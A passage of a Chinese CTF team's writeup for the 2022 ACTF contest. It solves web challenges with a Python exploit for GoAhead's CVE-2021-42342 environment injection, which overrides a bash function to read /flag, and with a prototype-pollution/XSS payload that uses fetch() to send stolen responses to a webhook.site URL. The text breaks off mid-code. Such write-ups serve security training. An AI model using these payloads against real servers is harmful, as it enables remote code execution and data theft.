<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2022 ACTF SU Writeup -</title><meta name=description content="本次2022 ACTF 我们 SU 取得了 第五名 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
以下是我们 SU 本次 2022 ACTF SU Writeup"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/actf-2022-su-wu\/","name":"2022 actf su writeup"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2022 ACTF SU Writeup","description":"本次2022 ACTF 我们 SU 取得了 第五名 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770) 以下是我们 SU 本次 2022 ACTF SU Writeup\n","inLanguage":"en","wordCount":4892,"datePublished":"2022-07-04T12:59:30\u002b00:00","dateModified":"2022-07-04T12:59:30\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["ACTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/actf-2022-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2022 ACTF SU Writeup"><meta property="og:description" content="本次2022 ACTF 我们 SU 取得了 第五名 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
以下是我们 SU 本次 2022 ACTF SU Writeup"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/actf-2022-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2022 ACTF SU Writeup"><meta name=twitter:description content="本次2022 ACTF 我们 SU 取得了 第五名 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
以下是我们 SU 本次 2022 ACTF SU Writeup"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href="https://su-team.cn/css/codeblock.css?v=20260212-fix3"><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2022 ACTF SU Writeup</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on July 4, 40730
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;23&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;4892&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><a href=#gogogo>gogogo</a></li><li><a href=#poorui>poorui</a></li><li><a href=#bewhatyouwannabe>beWhatYouWannaBe</a></li><li><a href=#tolesion>ToLeSion</a></li><li><a href=#myclient>myclient</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#signin>signin</a></li><li><a href=#mahjoong>Mahjoong</a></li><li><a href=#safer-telegram-bot-1>safer-telegram-bot-1</a></li><li><a href=#signoff>signoff</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#mykvm>mykvm</a></li><li><a href=#2048>2048</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#impossible-rsa>impossible RSA</a></li><li><a href=#rsa-leak>RSA LEAK</a></li></ul></li><li><a href=#rev>Rev</a><ul><li><a href=#dropper>dropper</a></li></ul></li><li><a href=#blockchain>Blockchain</a><ul><li><a href=#bet2loss>bet2loss</a></li><li><a href=#aaadao>AAADAO</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>本次2022 ACTF 我们 SU 取得了 第五名 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)
以下是我们 SU 本次 2022 ACTF SU Writeup</p><h1 id=web>Web</h1><h2 id=gogogo>gogogo</h2><p>先看dockerfile</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Dockerfile data-lang=Dockerfile><span class=line><span class=cl><span class=k>FROM</span><span class=s> debian:buster</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> <span class=nb>set</span> -ex <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=o>&amp;&amp;</span> sed -i <span class=s1>&#39;s/deb.debian.org/mirrors.ustc.edu.cn/g&#39;</span> /etc/apt/sources.list <span class=o>&amp;&amp;</span> sed -i <span class=s1>&#39;s/security.debian.org/mirrors.ustc.edu.cn/g&#39;</span> /etc/apt/sources.list <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=o>&amp;&amp;</span> apt-get update <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=o>&amp;&amp;</span> apt-get install wget make gcc -y <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=o>&amp;&amp;</span> wget -qO- https://github.com/embedthis/goahead/archive/refs/tags/v5.1.4.tar.gz <span class=p>|</span> tar zx --strip-components <span class=m>1</span> -C /usr/src/ <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=o>&amp;&amp;</span> <span class=nb>cd</span> /usr/src <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=o>&amp;&amp;</span> make <span class=nv>SHOW</span><span class=o>=</span><span class=m>1</span> <span class=nv>ME_GOAHEAD_UPLOAD_DIR</span><span class=o>=</span><span class=s2>&#34;&#39;\&#34;/tmp\&#34;&#39;&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=o>&amp;&amp;</span> make install <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=o>&amp;&amp;</span> cp src/self.key src/self.crt /etc/goahead/ <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=o>&amp;&amp;</span> mkdir -p /var/www/goahead/cgi-bin/ <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=o>&amp;&amp;</span> apt-get purge -y --auto-remove wget make gcc <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=o>&amp;&amp;</span> <span class=nb>cd</span> /var/www/goahead <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=o>&amp;&amp;</span> rm -rf /usr/src/ /var/lib/apt/lists/* <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=o>&amp;&amp;</span> sed -e <span class=s1>&#39;s!^# route uri=/cgi-bin dir=cgi-bin handler=cgi$!route uri=/cgi-bin dir=/var/www/goahead handler=cgi!&#39;</span> -i /etc/goahead/route.txt<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> flag /flag<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> chmod <span class=m>644</span> /flag<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> hello /var/www/goahead/cgi-bin/hello<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> chmod +x /var/www/goahead/cgi-bin/hello<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> groupadd -r ctf <span class=o>&amp;&amp;</span> useradd -r -g ctf ctf<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>EXPOSE</span><span class=s> 8081</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>USER</span><span class=s> ctf</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>CMD</span> <span class=p>[</span><span class=s2>&#34;goahead&#34;</span><span class=p>,</span> <span class=s2>&#34;-v&#34;</span><span class=p>,</span> <span class=s2>&#34;--home&#34;</span><span class=p>,</span> <span class=s2>&#34;/etc/goahead&#34;</span><span class=p>,</span> <span class=s2>&#34;/var/www/goahead&#34;</span><span class=p>,</span> <span class=s2>&#34;0.0.0.0:8081&#34;</span><span class=p>]</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>这里是用了一个goahead，而这里的hello路由放在了cgi-bin里面，而且输出了env</p><p><img src=/img/2022-ACTF-SU-Writeup/16568960717884.png alt=img></p><p>那么就不难找到是gohead的CVE-2021-42342，这个cve的内容是文件上传过滤器的处理缺陷，当与CGI处理程序一起使用时，可影响环境变量，从而导致RCE</p><p>记得p牛复现这个漏洞的时候踩坑专门写了篇<a href=https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html>文章</a></p><p>这和题目dockerfile如出一辙</p><p><img src=/img/2022-ACTF-SU-Writeup/16568961281067.png alt></p><p>而且我们的确可以传文件</p><p><img src=/img/2022-ACTF-SU-Writeup/165689613752610.png alt></p><p>接下来就是劫持LD_PRELOAD，对于这个东西的了解可以参考如下</p><blockquote><p>LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p></blockquote><p>我们编译一个so文件，因为可以操控env，那么我们传上去绑定LD_PRELOAD，然后就可以达到攻击的目的，但是我始终没复现成功</p><p>利用p牛复现的时候的技巧，添加脏字符让长度超过content-length还是没有起作用，不知道是不是没有注意到什么细节</p><p><img src=/img/2022-ACTF-SU-Writeup/165689614713613.png alt></p><p>后来发现p牛其实还发过一个<a href=https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html>文章</a>，也是关于环境变量攻击的</p><p><img src=/img/2022-ACTF-SU-Writeup/165689616141319.png alt></p><p>这里用</p><p><code>BASH_FUNC_xxx%%=(){id;}</code>，把原函数给覆盖掉</p><p>然后看到hello里面，他是执行了env的，所以我们把env给覆盖掉</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Dockerfile data-lang=Dockerfile><span class=line><span class=cl>BASH_FUNC_env%%:<span class=o>(</span>None,<span class=s2>&#34;() { cat /flag; exit; }&#34;</span><span class=o>)</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>即注册一个这样变量，让他执行env的时候，变成执行我们定义的函数内容</p><p>最后exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;BASH_FUNC_env</span><span class=si>%%</span><span class=s2>&#34;</span><span class=p>:(</span><span class=kc>None</span><span class=p>,</span><span class=s2>&#34;() { cat /flag; exit; }&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s2>&#34;http://123.60.84.229:10218/cgi-bin/hello&#34;</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2022-ACTF-SU-Writeup/165689617935222.png alt></p><h2 id=poorui>poorui</h2><p>在 compile template 的时候用到了旧版本的 lodash，有 prototype pollution 可以打。</p><p>在 render image 时用了 &lt;div {&mldr;attrs} />，可以传入自定义属性</p><p>传入 <code>is="abc"</code> 跟 <code>onanimationstart="JS_code"</code> 即可 XSS</p><p>做到 XSS 以后借由去复盖 JSON.stringify 改变传出去的 msg，再借由复盖 JSON.parse 拿到 response，即可拿到 flag</p><p>exp 如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTML data-lang=HTML><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>logDiv</span><span class=p>&gt;&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>exp</span> <span class=o>=</span> <span class=nx>btoa</span><span class=p>(</span><span class=sb>`
</span></span></span><span class=line><span class=cl><span class=sb>window.send=(msg)=&gt;{fetch(&#39;https://webhook.site/2f5fbcb1-c4aa-473a-adfd-23a7c5e19509?q=&#39;+encodeURIComponent(msg))};
</span></span></span><span class=line><span class=cl><span class=sb>send(&#39;start&#39;);
</span></span></span><span class=line><span class=cl><span class=sb>window.backup=JSON.stringify;window.backup2=JSON.parse;
</span></span></span><span class=line><span class=cl><span class=sb>JSON.stringify=function(json){
</span></span></span><span class=line><span class=cl><span class=sb>  JSON.stringify = backup;
</span></span></span><span class=line><span class=cl><span class=sb>  return backup({
</span></span></span><span class=line><span class=cl><span class=sb>    api: &#39;getflag&#39;
</span></span></span><span class=line><span class=cl><span class=sb>  })
</span></span></span><span class=line><span class=cl><span class=sb>};
</span></span></span><span class=line><span class=cl><span class=sb>JSON.parse=function(str){
</span></span></span><span class=line><span class=cl><span class=sb>  send(str);
</span></span></span><span class=line><span class=cl><span class=sb>  return backup2(str)
</span></span></span><span class=line><span class=cl><span class=sb>};
</span></span></span><span class=line><span class=cl><span class=sb>document.querySelector(&#39;button[type=submit]&#39;).click();
</span></span></span><span class=line><span class=cl><span class=sb>    `</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>log</span><span class=p>(</span><span class=nx>msg</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=nx>logDiv</span><span class=p>.</span><span class=nx>innerText</span> <span class=o>+=</span> <span class=nx>msg</span> <span class=o>+</span> <span class=s1>&#39;\n&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>WS_URL</span> <span class=o>=</span> <span class=s1>&#39;ws://124.71.181.238:8081&#39;</span>
</span></span><span class=line><span class=cl>    <span class=c1>//WS_URL = &#39;ws://localhost:8081&#39;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kr>const</span> <span class=nx>socket</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebSocket</span><span class=p>(</span><span class=nx>WS_URL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>socket</span><span class=p>.</span><span class=nx>onopen</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>log</span><span class=p>(</span><span class=s1>&#39;connected&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>msg</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>api</span><span class=o>:</span> <span class=s2>&#34;ping&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>data</span><span class=o>:</span> <span class=s2>&#34;hello world&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nx>socket</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>msg</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nx>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>socket</span><span class=p>.</span><span class=nx>onmessage</span> <span class=o>=</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>msg</span> <span class=o>=</span> <span class=nx>e</span><span class=p>.</span><span class=nx>data</span>
</span></span><span class=line><span class=cl>        <span class=nx>log</span><span class=p>(</span><span class=s1>&#39;received:&#39;</span><span class=o>+</span><span class=nx>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
